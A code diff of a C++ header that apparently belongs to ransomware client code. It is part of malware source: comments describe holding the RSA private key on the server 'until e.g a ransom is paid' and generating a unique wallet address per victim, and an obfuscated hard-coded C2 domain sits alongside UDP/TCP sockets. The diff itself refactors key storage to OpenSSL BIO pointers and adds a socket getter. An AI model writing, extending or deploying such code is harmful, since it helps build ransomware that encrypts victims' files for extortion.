@@ -9,6 +9,9 @@
 #include <memory>
 #include <algorithm>
 #include <random>
+#include <openssl/bio.h>
+
+#pragma comment(lib, "ws2_32.lib")
 
 const unsigned int UDP_PORT = 5454;
 const std::string  DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));
@@ -42,7 +45,7 @@ public:
         return generated;
     }
 
-    inline void SetRSAKeys(std::pair<std::string, std::string> RSAKeys) {
+    inline void SetRSAKeys(std::pair<BIO*, BIO*> RSAKeys) {
         this->RSAPublicKey = RSAKeys.first;
         this->RSAPrivateKey = RSAKeys.second;
     }
@@ -57,7 +60,7 @@ public:
         The rsa private key used to decrypt encrypted files with
         client public rsa key. only on server until e.g a ransom is paid
     */
-    std::string    RSAPrivateKey;
+    BIO*           RSAPrivateKey;
 
     /*
         A unique wallet address generated for a client
@@ -96,6 +99,10 @@ public:
     BOOL          PingServer(SocketTypes serverType);
     BOOL          ReceiveDataOnSocket(SocketTypes s);
     
+    inline const SOCKET GetTCPSocket() const {
+        return this->TCPSocket;
+    }
+
     /*
         Encrypt a ClientRequest struct with AES by serializing
         to a byte string, then encrypting that bytestring with AES
@@ -108,13 +115,6 @@ public:
     */
     ServerRequest DecryptServerRequest(BYTESTRING req); 
 
-    /*
-        Set the initial, permanant, encryption key for this client
-    */
-    inline void   SetEncryptionKey(std::string key) {
-        if ( this->AESEncryptionKey.empty() ) this->AESEncryptionKey = key;
-        if ( this->RSAPublicKey.empty() ) this->RSAPublicKey = key;
-    }
 protected:
 
     /*
@@ -148,12 +148,10 @@ protected:
     SOCKET        UDPSocket       = INVALID_SOCKET;
     SOCKET        TCPSocket       = INVALID_SOCKET;
 
-    std::string   AESEncryptionKey;               // Encryption key used to encrypt and decrypt
-
     /* 
         Used for encrypting files, not requests/NET_BLOBs
     */
-    std::string   RSAPublicKey;         
+    BIO*          RSAPublicKey;         
 
     sockaddr_in   AddressInfo; // client addr info
 };
